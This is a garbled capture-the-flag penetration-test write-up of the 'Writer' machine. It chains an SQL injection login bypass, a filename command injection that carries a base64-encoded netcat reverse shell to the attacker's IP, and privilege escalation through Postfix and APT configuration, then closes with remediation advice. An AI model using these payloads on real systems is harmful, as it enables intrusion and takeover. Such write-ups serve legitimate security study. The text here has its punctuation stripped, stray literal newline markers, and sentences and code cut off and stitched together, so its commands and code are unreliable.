title:  Writer Writeup
description: This system contained an SQL injection vulnerability which could be leveraged to not only log into an application with admin privileges, but also could be used to read local files on the target. After leaking the source code of the website, an insecure usage of handling files was exploited to get RCE. With a www-data shell on the system, an insecure password of a local user located in the SQL database was cracked. Eventually the system was fully compromised through misconfigurations relating to SMTP and APT.

simple login page The username field is vulnerable to a critical SQL injection which an attacker could leverage to login as an administrative user access sensitive local files and extract usernames and password hashes\n\nFollowing the authentication bypass an insecure image upload feature could be exploited to gain RCE on the target After obtaining a shell as the wwwdata user escalating privileges to the local kyle user could be done by way of cracking his hash in the dev SQL database The kyle user was part of the filter group which allowed for editing the configuration files of the SMTP service running locally on port 25 Because this service was running as the john user getting a shell via the service resulted in compromising his account\n\nFinally the john user is part of the management group which has access to the apt repository configuration files A cronjob running as root which performed a frequent aptget update command could therefore be taken advantage of and obtaining root privileges was possible through adding a reverse shell file in the apt configurations Please view the Post Exploitation Analysishui1gvqou6arf and Conclusionhm32hn92j9nqq sections to see remediations for these vulnerabilities\n\nAttack Narrative\n\n\nNo information was provided prior to this engagement other than the IP address of the target 101011101\n\nEnumeration\n\n\n Port

 The SMB service is of interest however there is no anonymous access to any of the shares\n\nreportsWriterimage1png\n\nSeeing as all of the services are up to date it follows that the HTTP service must be searched for potential vulnerabilities\n\n Web Enumeration\n\nUsers visiting the targets web server are met with the following home page\n\nreportsWriterimage4png\n\nEnumerating the

since it cannot be found without brute forcing directories Visiting this directory reveals a simple login form which asks for a username and password\n\nreportsWriterimage2png\n\nNote the domain of the target namely writerhtb However no virtual host routing is present\n\nSQL Injection\n\n\nWhen inputting OR 11  as the username and choosing a random value for the password the user is automatically authenticated thus confirming the presence of SQL injection As an authenticated user stories can be edited and created and pictures can be uploaded\n\nreportsWriterimage5png\n\nThe web page does not properly check if an uploaded file is an image as it was possible to upload a reverse shell by the name of phpreverseshelljpgphp This however did not lead to RCE as the web page nevertheless treated the file as an image Furthermore uploading a malicious image with PHP code did not work\n\nAn addition to the image upload feature is the ability to upload files given a url This could be utilized to cause the server to perform GET requests to an arbitrary website of the users choice\n\nRequest\n\n highlight bash  \nPOST dashboardstoriesadd HTTP11Host 101011101  \nUserAgent

Critically insecure code is highlighted in red and the text highlighted in purple is the segment that the undermentioned exploit focuses on\n\n Finding RCE Vulnerability\n\nWithin the source code are multiple examples of insecure code explored more in detail in the Post Exploitation Analysishui1gvqou6arf section One that particularly stands out is the call of ossystem on the uploaded filename Before testing exploits on the target the exploit was tested out locally to get a closer view as to how the program behaves Copying the segment of interest we can get a closer look at how the program treats file names\n\nCode \n\n highlight python \nimport urllib  \nimport os  \nfrom flask import request  \n  \nlocal_filename headers  urllibrequesturlretrievehttp10101580jpg1jpgsleep  \nprintThe

argument If a user were to upload a file called 1jpgsleep then the server will behave accordingly\n\n  \nResponse\n\nThe local_filename is tmptmpen3ya1q1\n\nHowever when changing the argument to be filehome0xd4ybusinesshacktheboxmediumlinuxwriterwwwjpg1jpgsleep 10 then command execution is performed This works because the urllib function does not correctly rename the file to something safe in the instance that the argument is using the file protocol Therefore a file with a malicious name can be uploaded using the image parameter and this file can then be referenced locally via the file protocol\n\n Reverse Shell\n\nAfter uploading a file with the name 0xd4yjpgecho n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDIJjF8bmMgMTAuMTAuMTUuODAgOTAwMSAL3RtcC9mbase64 dbash it

multiple groups one of them being the filter group which has permissions to edit the etcpostfixdisclaimer file Furthermore after enumerating the ports running locally on the target it was found that port 25 is open and running a Postfix SMTP server\n\nWith pspy2ftnt2 running on a separate kyle SSH instance the following message was sent on the box\n\nkylewriter nc localhost 25  \n220 writerhtb

Note that the mitigations shown in this section are incomplete pieces of code however they are secure implementations of the desired result\n\nSQLi Mitigation PDO\n\n\nThis machine contained multiple vulnerabilities starting with the SQL injection in the administrative page The vulnerability lies in the following SQL statement that is performed on the users query\n\n highlight sql \nSelect  From users Where username  s And password  s  username password\n endhighlight \n\nThis insecure SQL statement allows an attacker to add a single quote in their username and then perform an arbitrary SQL statement of their choosing To mitigate SQL injection attacks the current recommendation is to use PDO PHP Data Objects The following code does not directly pass the user input into the SQL statement Rather using PDO tells the server what the SQL query and the userinputted data are This is successfully performed because the instruction and userinput are sent separately to the database\n\n highlight php \nphp  \n  \ntry   \n  \n conn  new PDOmysqlhostservernamedbnamedbname db_username db_password  set the PDO error mode to exception connsetAttributePDOATTR_ERRMODE PDOERRMODE_EXCEPTION  prepare sql and bind parameters        query  INSERT INTO users usernamepassword  VALUESusernamepassword  \n        statement  connpreparequery  \n        statementexecutearray   username username   password password  \n          \n  \n catchPDOException e  echo Error   egetMessage  \n  \nconn  null  \n  \n\n endhighlight \n\nImage Upload RCE\n\n\nAfter successfully performing an SQL injection attack an upload feature in the webpage was exploited to gain RCE due to insecure python code System commands and evaluation functions should never be performed on user input As discussed in Finding RCE Vulnerabilityheswqky3qu6hx the system function in the os module was the reason for the critical RCE vulnerability The following code prevents this vulnerability\n\n highlight python \nfrom werkzeugutils import secure_filename\n\nfrom PIL import Image  \n  \nfilename  requestfileimage  \n  \nimage  StringIObase64b64decodedownloadfile  \nallowed_extensions  jpgjpeg  \nif filenamesplit1 in allowed_extensions        \n\t\t\t\ttry  \n                filename  secure_filenamefilename  \n  \n                img  Imageopenimage  \n                imgverify  \n                path  ospathjoinvarwwwwriterhtbwriterstaticimg filename                imagesavepath  \n        except Exception                printInvalid image  \nelse        \n\t\t\t\t\t\t\t\tprintFilename extension not allowed\n endhighlight \n\nThe above program verifies if a file is a valid image by first checking its extension Note that this is different from the source code of the website which simply searches for the presence of the jpg string in the filename After verifying the files extension PILs verify method is called on the file before the file is uploaded to the img directory\n\nConclusion\n\n\n  \n\nMultiple vulnerabilities were present on the target which resulted in a full compromise of the system The administrative page contained an SQL injection vulnerability which resulted in the leakage of local files and authentication bypass After authenticating to the server the insecure handling of filenames led to an RCE vulnerability\n\nAfterwards the privilege escalation to root involved logging into the system as the kyle user who had permissions to edit the mail service Due to the service running under john the lateral movement involved adding a reverse shell to the configuration of the service As the john user apt configurations could be modified to exploit an aptget update cronjob running as the root user Observe the following remediations to mitigate the vulnerabilities outlined in the report\n\n   Secure the SQL login page on administrative\n\n   PDO should be used in place of the insecure SQL statement see SQLi Mitigation PDOhnw8pksu8e5re\n\n   Never use system or any sort of evaluation function on userinput\n\n   The system command on the uploaded filename resulted in RCE\n\n   Never reuse passwords\n\n   As the wwwdata user kyles password could be retrieved by cracking his hash from the dev database This would not have been of much use if the local kyle user had a different password on the target\n   Passwords should be secure\n\n   Fix misconfigurations related to the kyle and john user\n\n   kyle was able to edit a service that was run by john To mitigate this the service should either be run by kyle or kyle should not have permissions to edit the service\n   john was able to edit apt configurations This sort of privilege should not be granted to any user By adding a reverse shell to the apt configurations any user who runs the apt command can be compromised by john\n\n  \n\n1ftnt_ref1
